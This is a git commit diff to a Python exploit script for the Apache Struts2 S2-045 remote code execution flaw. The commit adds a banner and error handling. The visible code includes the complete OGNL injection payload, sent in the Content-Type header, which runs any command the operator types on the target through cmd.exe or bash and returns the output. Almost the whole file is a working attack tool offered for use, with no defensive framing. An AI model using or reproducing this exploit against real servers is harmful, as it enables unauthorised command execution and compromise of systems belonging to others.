638a9853fcf3913717025480e93d7adc0ab1564f
S4kur4 <2570160655@qq.ccom>
2017-03-22 15:37:50 +0800

    Some changes
    add some beautiful changes.

--- exps/S2-045.py
+++ exps/S2-045.py
@@ -1,6 +1,14 @@
 #!/usr/bin/env python
 #-*- coding:utf-8 -*-
+#Strutrs2-045 RCE exp
 __author__ = '@S4kur4'
+name = "   _____ _              _       ___  \n"\
+       "  / ____| |            | |     |__ \ \n"\
+       " | (___ | |_ _ __ _   _| |_ ___   ) |\n"\
+       "  \___ \| __| '__| | | | __/ __| / / \n"\
+       "  ____) | |_| |  | |_| | |_\__ \/ /_ \n"\
+       " |_____/ \__|_|   \__,_|\__|___/____|EXP\n"\
+       "                                       "
 
 import urllib2
 import sys
@@ -20,6 +28,7 @@ header1 = {
 def main():
     register_openers()
     datagen, header2 = multipart_encode({"image1": open("tmp.txt", "rb")})
+    print name
     parser = optparse.OptionParser('usage: %prog [options]')
     parser.add_option('-u', '--url', dest='target_url', type='string', help='specify target URL')
     (options, args) = parser.parse_args()
@@ -29,12 +38,15 @@ def main():
     else:
         target_url = options.target_url
     target_url = target_url.rstrip('/')
-    command = raw_input("input command:")
+    command = raw_input("Input command:")
     header1["Content-Type"] = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+ command + "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
     header1["Content-Length"] = header2["Content-Length"]
-    request = urllib2.Request(target_url,datagen,headers=header1)
-    response = urllib2.urlopen(request)
-    print response.read()
+    try:
+    	request = urllib2.Request(target_url,datagen,headers=header1)
+    	response = urllib2.urlopen(request)
+    	print response.read()
+    except Exception, e:
+    	print "\033[1;31mUnsuccessful,maybe no vulnerable.\033[0m"
 
 if __name__ == '__main__':
     main()
